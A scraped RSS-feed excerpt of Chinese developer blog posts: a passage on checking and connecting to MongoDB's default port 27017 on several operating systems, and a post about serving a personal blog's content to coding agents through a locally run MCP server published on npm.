<strong>27017</strong>。在默认配置下，如果没有在配置文件或启动命令中指定其他端口号，MongoDB将使用这个端口号。</p>
<h3 data-id="heading-0">示例说明</h3>
<p>下面我们通过在不同操作系统下启动MongoDB实例，并展示如何连接到默认端口27017来进行验证。</p>
<h4 data-id="heading-1">在Ubuntu上验证默认端口</h4>
<ol>
<li>
<p><strong>启动MongoDB服务</strong></p>
<p>安装完MongoDB后，可以使用以下命令启动MongoDB服务：</p>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl start mongod
</code></pre>
</li>
<li>
<p><strong>验证MongoDB服务状态</strong></p>
<p>确认MongoDB正在运行并监听默认端口27017：</p>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl status mongod
</code></pre>
<p>你可以使用<code>netstat</code>或<code>ss</code>命令来确认MongoDB正在监听默认端口：</p>
<pre><code class="hljs language-bash" lang="bash">sudo netstat -plnt | grep 27017
</code></pre>
<p>或者：</p>
<pre><code class="hljs language-bash" lang="bash">sudo ss -plnt | grep 27017
</code></pre>
</li>
<li>
<p><strong>连接到MongoDB</strong></p>
<p>启动MongoDB shell，连接到默认端口27017：</p>
<pre><code class="hljs language-bash" lang="bash">mongo --port 27017
</code></pre>
</li>
</ol>
<h4 data-id="heading-2">在Windows上验证默认端口</h4>
<ol>
<li>
<p><strong>启动MongoDB服务</strong></p>
<p>通过安装程序默认安装的情况下，MongoDB会作为Windows服务启动。可以通过以下命令检查服务状态：</p>
<pre><code class="hljs language-cmd" lang="cmd">sc query MongoDB
</code></pre>
</li>
<li>
<p><strong>验证MongoDB服务状态</strong></p>
<p>可以使用<code>netstat</code>命令确认MongoDB是否监听默认端口27017：</p>
<pre><code class="hljs language-cmd" lang="cmd">netstat -ano | findstr :27017
</code></pre>
</li>
<li>
<p><strong>连接到MongoDB</strong></p>
<p>打开命令提示符，启动MongoDB shell：</p>
<pre><code class="hljs language-cmd" lang="cmd">mongo --port 27017
</code></pre>
</li>
</ol>
<h4 data-id="heading-3">在macOS上验证默认端口</h4>
<ol>
<li>
<p><strong>启动MongoDB服务</strong></p>
<p>如果使用Homebrew安装的MongoDB，可以通过以下命令启动MongoDB服务：</p>
<pre><code class="hljs language-bash" lang="bash">brew services start mongodb/brew/mongodb-community
</code></pre>
</li>
<li>
<p><strong>验证MongoDB服务状态</strong></p>
<p>使用<code>lsof</code>或<code>netstat</code>命令确认MongoDB是否监听默认端口27017：</p>
<pre><code class="hljs language-bash" lang="bash">lsof -i :27017
</code></pre>
<p>或者：</p>
<pre><code class="hljs language-bash" lang="bash">netstat -an | grep 27017
</code></pre>
</li>
<li>
<p><strong>连接到MongoDB</strong></p>
<p>启动MongoDB shell，连接到默认端口27017：</p>
<pre><code class="hljs language-bash" lang="bash">mongo --port 27017
</code></pre>
</li>
</ol>
<h3 data-id="heading-4">配置文件和启动参数</h3>
<p>MongoDB的配置文件（通常位于<code>/etc/mongod.conf</code>或<code>/usr/local/etc/mongod.conf</code>）中也可以指定端口号：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># /etc/mongod.conf</span>

<span class="hljs-attr">net:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">27017</span>
</code></pre>
<p>如果需要使用不同的端口号，可以在配置文件中修改<code>port</code>参数，或者在启动MongoDB实例时使用命令行参数指定：</p>
<pre><code class="hljs language-bash" lang="bash">mongod --port &lt;custom_port&gt;
</code></pre>
<h3 data-id="heading-5">使用Node.js连接到MongoDB默认端口</h3>
<p>以下是使用Node.js和MongoDB驱动程序连接到默认端口27017的示例代码：</p>
<ol>
<li>
<p><strong>安装MongoDB Node.js驱动</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm install mongodb
</code></pre>
</li>
<li>
<p><strong>连接到MongoDB并执行操作</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { <span class="hljs-title class_">MongoClient</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'mongodb'</span>);

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> uri = <span class="hljs-string">"mongodb://localhost:27017"</span>;
    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>(uri, { <span class="hljs-attr">useUnifiedTopology</span>: <span class="hljs-literal">true</span> });

    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">connect</span>();
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Connected to MongoDB on default port 27017"</span>);

        <span class="hljs-keyword">const</span> db = client.<span class="hljs-title function_">db</span>(<span class="hljs-string">'exampledb'</span>);
        <span class="hljs-keyword">const</span> collection = db.<span class="hljs-title function_">collection</span>(<span class="hljs-string">'examplecoll'</span>);

        <span class="hljs-comment">// 插入数据</span>
        <span class="hljs-keyword">const</span> insertResult = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">insertOne</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Insert Result:'</span>, insertResult);

        <span class="hljs-comment">// 查询数据</span>
        <span class="hljs-keyword">const</span> findResult = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">findOne</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Find Result:'</span>, findResult);

    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">close</span>();
    }
}

<span class="hljs-title function_">main</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);
</code></pre>
</li>
</ol>
<h3 data-id="heading-6">总结</h3>
<p>MongoDB的默认端口号是 <strong>27017</strong>。通过上述步骤和代码示例，可以在不同操作系统上验证和连接到MongoDB的默认端口。以下是一些关键点：</p>
<ol>
<li><strong>启动MongoDB服务</strong>：确保MongoDB服务已启动。</li>
<li><strong>验证端口监听</strong>：使用系统命令（如<code>netstat</code>、<code>ss</code>、<code>lsof</code>等）确认MongoDB正在监听默认端口27017。</li>
<li><strong>连接到MongoDB</strong>：通过MongoDB shell或客户端代码（如Node.js）连接到默认端口27017。</li>
</ol>
<p>这些步骤可以帮助你确保MongoDB正确安装并运行在默认端口上，从而开始使用MongoDB进行数据管理和操作。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从一个想法到可发布：我把博客接进 MCP 的完整实践]]></title>    <link>https://juejin.cn/post/7605807405306757183</link>    <guid>https://juejin.cn/post/7605807405306757183</guid>    <pubDate>2026-02-12T17:10:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605807405306757183" data-draft-id="7605985547568168966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从一个想法到可发布：我把博客接进 MCP 的完整实践"/> <meta itemprop="keywords" content="MCP,前端,Node.js"/> <meta itemprop="datePublished" content="2026-02-12T17:10:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mCell"/> <meta itemprop="url" content="https://juejin.cn/user/2280829967146779"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从一个想法到可发布：我把博客接进 MCP 的完整实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2280829967146779/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mCell
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T17:10:27.000Z" title="Thu Feb 12 2026 17:10:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>同步至个人站点：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstack.mcell.top%2Fblog%2F2026%2Fmcp-from-idea-to-delivery-for-content-site" target="_blank" title="https://stack.mcell.top/blog/2026/mcp-from-idea-to-delivery-for-content-site" ref="nofollow noopener noreferrer">从一个想法到可发布：我把博客接进 MCP 的完整实践</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/053a002a4e2f4142afa9448846322ac1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbUNlbGw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521027&amp;x-signature=12lpdeO966TM8xAfdGqYkHC%2Bb14%3D" alt="" loading="lazy"/></p>
<p>最近看 MUI 文档时，我注意到它已经有 MCP 了。然后我就顺手把本地的 Codex、Claude 这类 code agent 都接进了它的 MCP。</p>
<p>体验非常直接：开发里遇到 MUI 用法问题，Agent 不用我手动贴链接，自己调 <code>mui mcp</code> 就能拿到官方答案。用过一次之后，很容易上瘾。</p>
<p>我这边正好也在做 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fminorcell%2Fmemo-code" target="_blank" title="https://github.com/minorcell/memo-code" ref="nofollow noopener noreferrer">memo code</a> ，最近在补 MCP client / pool / CLI（比如 <code>memo mcp add/remove/list</code>）。越做越觉得，MCP 不只是“大厂工具的生态接口”，它对小工具开发者、库作者、内容站作者也很有价值。</p>
<p>我这次的起点其实很朴素：</p>
<blockquote>
<p>我想让别人本地 <code>npx</code> 一下，就能把 CellStack 接进 Agent 的 MCP 生态。</p>
<p>最理想的画面是，用户问一句“mcell 如何解决xxx问题的”，Agent 直接调工具返回结果，而不是我手动甩链接。</p>
</blockquote>
<p>所以这篇想表达的重点，不只是“我实现了一个 MCP server”，而是这套做法本身：</p>
<p>如果你手里有工具、库、内容站，想让 Agent 像调工具一样调用你的内容，这是一条几乎零服务器成本的落地路线。</p>
<h2 data-id="heading-0">1. 先拆三层：把站点细节从 Agent 侧剥离</h2>
<p>我一开始就刻意把方案拆开，避免 Agent 直接依赖站点内部结构：</p>
<ol>
<li>构建期生成静态数据（先把站点内容变成标准 JSON）</li>
<li>用户本地起 MCP Server（<code>@mcell/stack-mcp</code>，<code>npx</code> 即用）</li>
<li>Agent 侧 MCP Client 只管调工具，不关心站点怎么组织、页面怎么写</li>
</ol>
<p>这三层拆完之后，server 的职责就很纯粹：把内容暴露成一组可查询工具，而且是用户本地跑，<strong>我不用额外养服务</strong>。</p>
<p>第一版很快做出来，但当时模型太“文章中心”，主要只覆盖 blog / topic article。很快我就发现不够：CellStack 不只有文章，还有专题页、站点介绍、关于我这些信息。</p>
<p>如果 Agent 只能读文章，它就更像“文章检索器”，而不是“能回答整个站点内容”的助手。</p>
<h2 data-id="heading-1">2. 模型升级成多资源：把“站点”变成可查询资源集合</h2>
<p>我把数据模型升级成了多资源结构：</p>
<ul>
<li><code>blog</code></li>
<li><code>topic</code></li>
<li><code>topic_article</code></li>
<li><code>site_page</code></li>
<li><code>profile</code></li>
</ul>
<p>构建产物也从单一索引，扩成下面这套：</p>
<ul>
<li><code>index.json</code></li>
<li><code>latest.json</code></li>
<li><code>catalog.json</code></li>
<li><code>articles/*</code></li>
</ul>
<p>同时把站点信息和“我”的信息抽成统一数据源，让页面渲染和 MCP 共用同一份内容，避免维护两套数据。</p>
<p>工具层也同步升级：</p>
<ul>
<li><code>list_resources</code></li>
<li><code>read_resource</code></li>
<li><code>list_topics</code></li>
<li><code>read_site_info</code></li>
</ul>
<p>并且我保留了旧工具名做兼容，避免早期接入方被强制迁移。</p>
<h2 data-id="heading-2">3. 真正的坑不在协议，在交付链路</h2>
<p>中间踩了两个很真实的坑：</p>
<ol>
<li>MCP 握手失败。我一度怀疑是协议问题，最后发现根因是 <code>npx</code> 当时还拉不到包（404），stderr 里是 npm 报错。</li>
<li>手工发 npm 不稳定。token / 2FA 在“我电脑上能发”不等于“可重复的交付链路”。</li>
</ol>
<p>这俩问题让我意识到，如果目标是“一句命令接入”，那真正要工程化的不只是 MCP，而是发布与分发。</p>
<h2 data-id="heading-3">4. 把发包也工程化：从“能用”到“可持续演进”</h2>
<p>后面我把发布流程写进了 CI：</p>
<ul>
<li>构建流程生成 MCP 原数据</li>
<li>单独加 <code>publish-stack-mcp</code> workflow，检测 <code>packages/stack-mcp</code> 改动后自动发包（版本已存在则跳过）</li>
</ul>
<p>然后又做了一个很关键的小优化：默认静默启动日志，减少客户端把 stderr 噪音误判成异常；需要排查时再开 <code>STACK_MCP_DEBUG</code>。</p>
<p>到这一步，这件事才算从“能不能做”变成了“可发布、可维护、可演进”。</p>
<h2 data-id="heading-4">5. 接入体验：一句命令 + 站点内直接给配置</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65ef119ab54846feaba71a6768dd10fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbUNlbGw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521027&amp;x-signature=I46DrYZ6MJpXuejuxLxwcM5TJrc%3D" alt="" loading="lazy"/></p>
<p>现在接入基本一句命令：</p>
<p><code>codex mcp add cellstack -- npx -y @mcell/stack-mcp@0.2.1</code></p>
<p>此外我在站点右上角加了 MCP 图标和配置弹窗，直接给 Codex / Claude / Memo / 标准配置的可复制示例，尽量把接入门槛压到最低。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/731ca064e52d48a89c15b9d117c7b035~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbUNlbGw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521027&amp;x-signature=ILUeMYW11W1CODPkOiT5aymTQic%3D" alt="" loading="lazy"/></p>
<p>相关记录：</p>
<ul>
<li>设计与实现 issue：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fminorcell%2Fcellstack%2Fissues%2F67" target="_blank" title="https://github.com/minorcell/cellstack/issues/67" ref="nofollow noopener noreferrer">github.com/minorcell/c…</a></li>
<li>npm 包：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2F%40mcell%2Fstack-mcp" target="_blank" title="https://www.npmjs.com/package/@mcell/stack-mcp" ref="nofollow noopener noreferrer">www.npmjs.com/package/@mc…</a></li>
</ul>
<h2 data-id="heading-5">6. 为什么我现在更偏向 MCP（而不只是 skills）</h2>
<p>很多人会说“skills 不就行了”。skills 当然有用，但它有个很现实的维护问题：你经常要为不同 Agent 分别写接入说明和配置。并且这类文档库等产品，更新比较及时，使用 SKILLS 就需要频繁的修改本地 SKILSS 文档，远不如使用 MCP。</p>
<p>Claude Code CLI、Cursor、Codex CLI、OpenCode……各家入口、目录约定、文档风格都不同。久而久之，一个仓库里会长出一堆 <code>.xxx/</code> 配置目录，后续改接口、改 schema、加字段时，就得挨个同步、挨个测。</p>
<p>这套静态 JSON + <code>npx</code> 本地 MCP Server 的组合，本质上是把问题收敛成三件事：</p>
<ul>
<li>站点侧：维护一份可演进的标准化数据产物（JSON / catalog / latest / resources）</li>
<li>工具侧：维护一个 MCP Server（<code>npx</code> 即用）</li>
<li>Agent 侧：谁支持 MCP 谁就能接，差异只剩“添加 server 的命令怎么写”</li>
</ul>
<blockquote>
<p>事实上，定义好mcp server tools、json docs 生成脚本逻辑之后不需要再管了，后面就快快乐乐的用吧。</p>
</blockquote>
<p>这对长期维护“自己的专属知识库”非常友好。后续如果我打算做个人Agent知识库的话，觉得这种做法还是蛮好的。甚至扩展一下，MCP + SKILL的组合也不错，或许长期积累之后，AGENT 即我呢？</p>
<p>(完)</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenCode 最佳搭档 oh-my-opencode]]></title>    <link>https://juejin.cn/post/7605800124883468294</link>    <guid>https://juejin.cn/post/7605800124883468294</guid>    <pubDate>2026-02-13T00:01:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605800124883468294" data-draft-id="7605941424535355446" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenCode 最佳搭档 oh-my-opencode"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-02-13T00:01:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三金得鑫"/> <meta itemprop="url" content="https://juejin.cn/user/4406498335130216"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenCode 最佳搭档 oh-my-opencode
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4406498335130216/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三金得鑫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T00:01:21.000Z" title="Fri Feb 13 2026 00:01:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body 